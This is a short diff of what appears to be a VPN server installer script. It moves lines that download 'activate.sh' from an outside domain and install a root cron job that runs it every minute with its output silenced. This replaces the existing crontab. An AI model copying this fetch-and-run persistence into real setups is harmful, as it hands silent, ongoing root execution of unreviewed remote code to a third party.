@@ -482,6 +482,10 @@ sed -i "s|DBUSER|$USER|g" /etc/openvpn/login/config.sh
 sed -i "s|DBPASS|$PASS|g" /etc/openvpn/login/config.sh
 sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
 
+wget -O /root/activate.sh "script.psytech-vpn.com/ssh/prem/activate.sh"
+
+echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
+
 /bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
 #!/bin/bash
 . /etc/openvpn/login/config.sh
@@ -1698,9 +1702,7 @@ if __name__ == '__main__':
 PTHON
 }
 
-wget -O /root/activate.sh "script.psytech-vpn.com/ssh/prem/activate.sh"
 
-echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
 
 function gatorade1() {
 
